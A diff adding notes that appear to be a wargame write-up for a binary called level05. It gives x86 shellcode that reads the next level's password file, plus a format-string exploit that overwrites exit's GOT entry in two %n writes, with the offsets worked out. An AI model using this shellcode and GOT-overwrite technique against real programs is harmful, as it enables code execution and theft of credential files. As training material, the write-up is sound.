@@ -1,0 +1,21 @@
+- we can use printf to run our shellcode so let's prepare the varibale environment
+	- export EXPLOIT=$(ruby -e 'print "\x90" * 128 +
+	"\x31\xc0\xb0\x05\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x36\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x8d\x1c\x24\x31\xc9\x31\xd2\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x83\xec\x28\x8d\x0c\x24\x31\xd2\xb2\x28\xcd\x80\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x8d\x0c\x24\x31\xd2\xb2\x28\xcd\x80"')
+
+- env_checker EXPLOIT 128 = 0xffffd869
+
+- we'll rewrite the exit entry in the GOT to run the shellcode
+	- exit @ 0x080497e0 in GOT (0x080497e0)
+
+- the only issue here is that the address of EXPLOIT is too big to be written through %n specifier, so we need to do it in 2 steps
+	- 0x0000d869 (55401) @ 0x080497e0
+	- 0x0000ffff (65535) @ 0x080497e2
+
+- after some math we can build our exploit command
+	- 55401 - 8 (for the 2 addresses at the begining of str) = 55393
+	- 65535 - 55401 = 10134
+	- 0x28 = 4 * 10 bytes (%10$n and %11$n)
+
+- finally
+	- ruby -e 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55393x" + "%10$n" + "%10134x" + "%11$n"' | ./level05
+
